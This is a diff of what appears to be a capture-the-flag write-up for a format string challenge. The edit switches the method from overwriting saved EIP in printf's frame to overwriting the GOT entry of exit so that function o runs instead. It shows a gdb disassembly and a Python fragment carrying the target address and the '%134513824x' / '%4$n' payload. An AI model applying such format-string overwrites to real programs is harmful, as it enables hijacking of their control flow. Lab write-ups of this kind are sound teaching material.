@@ -26,14 +26,15 @@ Though, after the call of <printf>, there is a call to the <exit> function.
 So if we overwrite EIP in n function stack frame, our overwritten EIP will never
 be restored.
 
-However, we can overwrite EIP in printf function stack frame. So when printf
-function will return, our overwritten EIP will be restored.
+However, we have the possibility to overwrite <exit> in the <n> function and call <o> instead of <exit>.
 
-In printf function, EIP is stored at address 0xbffff50c.
+$ (gdb) disas exit
+   0x080483d0 <+0>:	jmp    ==> *0x8049838 <==
+
 
 ```python
 #! /usr/bin/env python
-M_ADDR          = "\x0c\xf5\xff\xbf"
+M_ADDR          = "\x38\x98\x04\x08"
 OVERWRITE       = "%134513824x"
 N               = "%4$n"
 
